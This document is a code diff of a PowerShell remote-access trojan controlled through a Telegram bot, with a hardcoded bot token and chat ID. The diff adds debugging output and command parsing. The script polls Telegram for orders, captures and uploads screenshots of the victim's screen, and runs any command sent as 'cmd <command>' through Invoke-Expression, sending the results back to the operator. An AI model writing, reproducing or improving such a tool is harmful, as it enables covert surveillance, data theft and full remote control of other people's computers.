@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
-$chatId = "6494641721"
+$chatId = "6494641721"  # Твой ID
 $apiUrl = "https://api.telegram.org/bot$botToken"
 
 function Send-TG ($t, $isPath=$false) {
@@ -12,47 +12,92 @@ function Send-TG ($t, $isPath=$false) {
             $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
             Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -ErrorAction Stop
         }
-    } catch { }
+    } catch { 
+        Write-Host "Send error: $_" -ForegroundColor Red
+    }
 }
 
-Send-TG "Online"
+# Тест отправки
+Send-TG "Bot started on $env:COMPUTERNAME"
+
 $lastId = 0
 
 while ($true) {
     try {
-        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
-        if ($res.result) {
-            foreach ($u in $res.result) {
-                $lastId = $u.update_id
-                $msg = $u.message.text
-                if ($u.message.from.id -eq $chatId) {
-                    switch ($msg) {
-                        "/start" { Send-TG "Ready" }
-                        "/help"  { Send-TG "shot, kill, cmd" }
-                        "shot" {
-                            Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-                            $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
-                            $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
-                            $g = [Drawing.Graphics]::FromImage($b)
-                            $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
-                            $tmp = "$env:TEMP\s.png"
-                            $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
-                            $g.Dispose()
-                            $b.Dispose()
-                            Send-TG $tmp $true
-                            if(Test-Path $tmp){ rm $tmp }
+        $url = "$apiUrl/getUpdates?offset=$($lastId + 1)&limit=10"
+        Write-Host "Polling: $url" -ForegroundColor DarkGray
+        
+        $res = Invoke-RestMethod -Uri $url -TimeoutSec 25 -ErrorAction Stop
+        
+        Write-Host "Got $($res.result.Count) updates" -ForegroundColor Cyan
+        
+        if ($res.result.Count -eq 0) { 
+            Start-Sleep -Milliseconds 500
+            continue 
+        }
+
+        foreach ($u in $res.result) {
+            $lastId = $u.update_id
+            Write-Host "Update ID: $lastId" -ForegroundColor Yellow
+            
+            # ДЕБАГ: покажи всё что пришло
+            Write-Host "Message object:" -ForegroundColor Magenta
+            $u.message | ConvertTo-Json -Depth 3 | Write-Host
+            
+            $msgText = $u.message.text
+            $fromId = $u.message.from.id
+            $msgChatId = $u.message.chat.id
+            
+            Write-Host "From ID: $fromId | Chat ID: $msgChatId | Text: $msgText" -ForegroundColor Green
+            
+            # ПРОВЕРКА: разрешаем если from.id ИЛИ chat.id совпадают (число vs строка)
+            $allowed = ($fromId -eq [int64]$chatId) -or ($msgChatId -eq [int64]$chatId) -or 
+                       ($fromId -eq $chatId) -or ($msgChatId -eq $chatId)
+            
+            if (-not $allowed) {
+                Write-Host "ACCESS DENIED: from=$fromId, chat=$msgChatId" -ForegroundColor Red
+                continue
+            }
+
+            Write-Host "Processing command: $msgText" -ForegroundColor Green
+
+            switch -Regex ($msgText) {
+                "^/start$" { Send-TG "Ready" }
+                "^/help$"  { Send-TG "Commands: shot, kill, cmd <command>" }
+                "^shot$" {
+                    Send-TG "Taking screenshot..."
+                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+                    $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
+                    $g = [Drawing.Graphics]::FromImage($b)
+                    $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
+                    $tmp = "$env:TEMP\ss_$([Guid]::NewGuid().ToString().Substring(0,8)).png"
+                    $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
+                    $g.Dispose(); $b.Dispose()
+                    Send-TG $tmp $true
+                    if(Test-Path $tmp){ Remove-Item $tmp -Force }
+                }
+                "^kill$" { Send-TG "Offline"; exit }
+                default {
+                    if ($msgText -match "^cmd\s+(.+)") {
+                        try {
+                            $cmd = $matches[1]
+                            $out = Invoke-Expression $cmd 2>&1 | Out-String
+                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "Done (no output)" } else { $out }
+                            Send-TG "``$cmd``:`n$resOut"
+                        } catch { 
+                            Send-TG "Error: $_" 
                         }
-                        "kill" { Send-TG "Offline"; exit }
-                        default {
-                            try {
-                                $out = Invoke-Expression $msg 2>&1 | Out-String
-                                $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "Done" } else { $out }
-                                Send-TG $resOut
-                            } catch { Send-TG "Error" }
-                        }
+                    }
+                    else {
+                        Send-TG "Unknown command. Use /help"
                     }
                 }
             }
         }
-    } catch { Start-Sleep -Seconds 5 }
+    } 
+    catch { 
+        Write-Host "ERROR: $_" -ForegroundColor Red
+        Start-Sleep -Seconds 2 
+    }
 }
